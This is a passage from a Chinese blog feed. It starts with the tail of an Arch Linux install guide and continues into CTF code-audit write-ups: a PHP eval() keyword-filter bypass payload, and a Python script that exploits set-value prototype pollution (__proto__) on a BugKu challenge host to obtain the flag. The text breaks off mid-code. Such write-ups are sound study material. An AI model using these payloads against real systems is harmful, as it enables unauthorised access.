/mnt/home<span class="token function">mount</span> /dev/sdax /mnt/home<span class="token function">mkdir</span> /mnt/boot<span class="token function">mount</span> /dev/sdax /mnt/boot<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="11-安装系统"><a href="#11-安装系统" class="headerlink" title="11.安装系统"></a>11.安装系统</h3><p>基础包</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacstrap /mnt base base-devel linux linux-firmware  <span class="token comment">#base-devel在AUR包的安装是必须的</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>功能性软件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacstrap /mnt dhcpcd iwd <span class="token function">vim</span> <span class="token function">sudo</span> bash-completion   <span class="token comment">#一个有线所需 一个无线所需 一个编辑器  一个提权工具 一个补全工具 iwd也需要dhcpcd</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="12-生产-fstab"><a href="#12-生产-fstab" class="headerlink" title="12.生产 fstab"></a>12.生产 fstab</h3><p>fstab 用来定义磁盘分区</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">genfstab -U /mnt <span class="token operator">>></span> /mnt/etc/fstab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>复查一下 /mnt/etc/fstab 确保没有错误</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /mnt/etc/fstab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="13-change-root"><a href="#13-change-root" class="headerlink" title="13.change root"></a>13.change root</h3><p>把环境切换到新系统的/mnt 下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arch-chroot /mnt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="14-时区"><a href="#14-时区" class="headerlink" title="14.时区"></a>14.时区</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime     <span class="token comment">#为/usr下合适的时区在/etc下创建符号连接</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="15-硬件时间设置"><a href="#15-硬件时间设置" class="headerlink" title="15.硬件时间设置"></a>15.硬件时间设置</h3><p>将系统时间同步到硬件时间</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hwclock --systohc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="16-设置-Locale"><a href="#16-设置-Locale" class="headerlink" title="16.设置 Locale"></a>16.设置 Locale</h3><p>Locale 决定了软件使用的语言、书写习惯和字符集。</p><p>编辑 /etc/locale.gen，去掉 en_US.UTF-8 行以及 zh_CN.UTF-8 的注释符号（#）。</p><p>然后使用如下命令生成 locale。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">locale-gen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>向 /etc/locale.conf 输入内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'LANG=en_US.UTF-8'</span>  <span class="token operator">></span> /etc/locale.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="17-为-root-用户设置密码"><a href="#17-为-root-用户设置密码" class="headerlink" title="17.为 root 用户设置密码"></a>17.为 root 用户设置密码</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">passwd</span> root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="18-安装微码"><a href="#18-安装微码" class="headerlink" title="18.安装微码"></a>18.安装微码</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman -S intel-ucode   <span class="token comment">#Intel</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="19-安装引导程序"><a href="#19-安装引导程序" class="headerlink" title="19.安装引导程序"></a>19.安装引导程序</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman -S grub efibootmgr   <span class="token comment">#grub是启动引导器，efibootmgr被 grub 脚本用来将启动项写入 NVRAM。</span>grub-install --target<span class="token operator">=</span>x86_64-efi --efi-directory<span class="token operator">=</span>/boot --bootloader-id<span class="token operator">=</span>GRUB <span class="token comment">#取名为GRUB 并将grubx64.efi安装到之前的指定位置</span><span class="token function">grub-mkconfig</span> -o /boot/grub/grub.cfg    <span class="token comment">#生成GRUB所需的配置文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> -p /boot/EFI/BOOT<span class="token function">mv</span> /boot/EFI/GRUB/grubx64.efi /boot/EFI/BOOT/BOOTX64.EFI<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="20-完成安装"><a href="#20-完成安装" class="headerlink" title="20.完成安装"></a>20.完成安装</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">exit</span>                <span class="token comment"># 退回安装环境#</span><span class="token function">umount</span> -R  /mnt     <span class="token comment"># 卸载新分区</span><span class="token function">reboot</span>              <span class="token comment"># 重启</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注意，重启前要先拔掉优盘，否则你重启后还是进安装程序而不是安装好的系统。重启后，开启 dhcp 服务，即可连接网络</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl start dhcpcd  <span class="token comment">#立即启动dhcp</span><span class="token function">ping</span> www.baidu.com      <span class="token comment">#测试网络连接</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>若为无线链接，则还需要启动 iwd 才可以使用 iwctl 连接网络</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl start iwd <span class="token comment">#立即启动iwd</span>iwctl               <span class="token comment">#和之前的方式一样，连接无线网络</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Code Audit</title>
      <link href="2021/web/codeaudit/"/>
      <url>2021/web/codeaudit/</url>
      
        <content type="html"><![CDATA[<h2 id="php绕过"><a href="#php绕过" class="headerlink" title="php绕过"></a>php绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">require</span> <span class="token constant">__DIR__</span><span class="token operator">.</span><span class="token string single-quoted-string">'/flag.php'</span><span class="token punctuation">;</span><span class="token comment">#require同include，区别：出错时，require将导致脚本中止而include只产生警告（E_WARNING），脚本会继续运行</span><span class="token comment">#PHP5.3新增魔术常量 __DIR__指向当前执行PHP脚本所在目录，__FILE__执向当前执行PHP脚本</span>        <span class="token variable">$exam</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'return\''</span><span class="token operator">.</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'\';'</span><span class="token punctuation">;</span><span class="token comment">#sha1--计算字符串的 sha1 散列值     time--返回当前时间戳</span><span class="token comment">#这个的意思就是将当前时间戳进行sha1加密后拼接在中间赋值给$exam</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="./?flag='</span><span class="token operator">.</span><span class="token variable">$exam</span><span class="token operator">.</span><span class="token string single-quoted-string">'">Click here&lt;/a>'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$exam</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'长度不允许'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/`|"|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'关键字不允许'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'马老师发生甚么事了'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;hr>'</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>第一个if：判断是否传参变量flag，没有就输出$exam和一些html<br>第二个if：判断flag变量的长度是否和$exam的长度相等<br>第三个if：过滤一些关键字符<br>第四个if：eval执行flag变量里面的内容，并且要等于flag变量的SHA-1散列</p></blockquote><p>这里学到了php中**$$引用变量<strong>的特性和</strong>php短写标签**的特性</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//引用变量<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"hello"</span><span class="token punctuation">;</span>      <span class="token comment">//声明一个不同的变量 $a 值为 hello</span>     <span class="token variable">$$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"world"</span><span class="token punctuation">;</span>     <span class="token comment">//声明一个可变变量 $$a,相当于 $hello 的值是 world</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$a</span></span> <span class="token interpolation"><span class="token variable">$hello</span></span>"</span><span class="token punctuation">;</span>  <span class="token comment">//输出 hello world</span>    <span class="token comment">//php短标签特性  ( &lt;?= 代替 &lt;?echo )</span><span class="token number">1.</span><span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token keyword">echo</span> <span class="token string double-quoted-string">"abc"</span><span class="token delimiter important">?></span></span>2.<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string double-quoted-string">"abc"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//上面两个语句都是输出abc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先点击<code>clickhere</code>获取$exam的值<code>return’5e22e75193f17cf3e608058536d49e4a7fd7dc56’;</code></p><p>payload:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">?flag=$w=blag;$w&#123;0&#125;=f;?>888888888888888888888;<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$$w</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="sodirty"><a href="#sodirty" class="headerlink" title="sodirty"></a>sodirty</h2><p>打开网页后没有任何有用信息</p><p>扫描网站得到<a href="http://www.zip的备份文件/">www.zip的备份文件</a></p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> setFn <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'set-value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> Admin <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"password"</span><span class="token operator">:</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>password<span class="token operator">?</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>password<span class="token operator">:</span><span class="token string">"password"</span><span class="token punctuation">&#125;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/getflag"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password <span class="token operator">===</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>challenger<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"登录失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>challenger<span class="token punctuation">.</span>age <span class="token operator">></span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"糟老头子坏滴很"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">let</span> key <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>key<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>Admin<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">===</span> password<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>flag <span class="token operator">?</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>flag <span class="token operator">:</span> <span class="token string">"flag&#123;test&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"密码错误，请使用管理员用户名登录."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/reg'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>challenger <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token operator">:</span> <span class="token string">"user"</span><span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token operator">:</span> <span class="token string">"pass"</span><span class="token punctuation">,</span>        <span class="token string">"age"</span><span class="token operator">:</span> <span class="token number">80</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"用户创建成功!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'&lt;title>BUGKU-登录&lt;/title>&lt;h1>前端被炒了&lt;br>&lt;br>&lt;br>&lt;a href="./reg">注册&lt;/a>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/update"</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>challenger <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/reg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>attrkey <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>attrval <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"传参有误"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> key <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>attrkey<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> value <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>attrval<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">setFn</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>challenger<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"修改成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>1.注册跳转至”/reg”会创建一个challenger用户字典<br>2.”/update”可以对challenger传参键值对（attrkey和attrval），对challenger字典中进行修改<br>3.”/getflag”可以获取到flag，但存在几个验证，首先需要传参两个参数（key和password）进来，并且对用户字典中的年龄进行判断，大于79会失败；其次Admin[key]需要等于password，而body.password未知</p></blockquote><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 这里提交一个不一样的密码即可</span><span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span>     req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password <span class="token operator">===</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>challenger<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"登录失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">// 这里使用/update修改年龄</span><span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>challenger<span class="token punctuation">.</span>age <span class="token operator">></span> <span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"糟老头子坏滴很"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 要求admin的键值强等于password，而</span><span class="token keyword">const</span> Admin <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"password"</span><span class="token operator">:</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>password<span class="token operator">?</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>password<span class="token operator">:</span><span class="token string">"password"</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> key <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>key<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> password <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>Admin<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">===</span> password<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>flag <span class="token operator">?</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span>flag <span class="token operator">:</span> <span class="token string">"flag&#123;test&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"密码错误，请使用管理员用户名登录."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>到这里卡住了很久，搜索之后才发现这里有个JS原型链污染漏洞</p><p>参考：</p><blockquote><p><a href="https://xz.aliyun.com/t/7182">https://xz.aliyun.com/t/7182</a></p><p><a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a></p></blockquote><p>利用这个漏洞就可以自己定义一个password了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://114.67.246.176:11885"</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span> <span class="token punctuation">&#125;</span>req <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>test <span class="token operator">=</span> req<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/reg"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>test<span class="token punctuation">.</span>text<span class="token punctuation">)</span>r <span class="token operator">=</span> req<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/update"</span><span class="token punctuation">,</span>json<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"attrkey"</span><span class="token punctuation">:</span><span class="token string">"__proto__.pwd22"</span><span class="token punctuation">,</span><span class="token string">"attrval"</span><span class="token punctuation">:</span><span class="token string">"pwd"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>r <span class="token operator">=</span> req<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/update"</span><span class="token punctuation">,</span>json<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"attrkey"</span><span class="token punctuation">:</span><span class="token string">"age"</span><span class="token punctuation">,</span><span class="token string">"attrval"</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>r <span class="token operator">=</span> req<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/getflag"</span><span class="token punctuation">,</span>json<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"pwd22"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"pwd"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210221193537635.png"></p><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">// php版本:5.4.44</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span 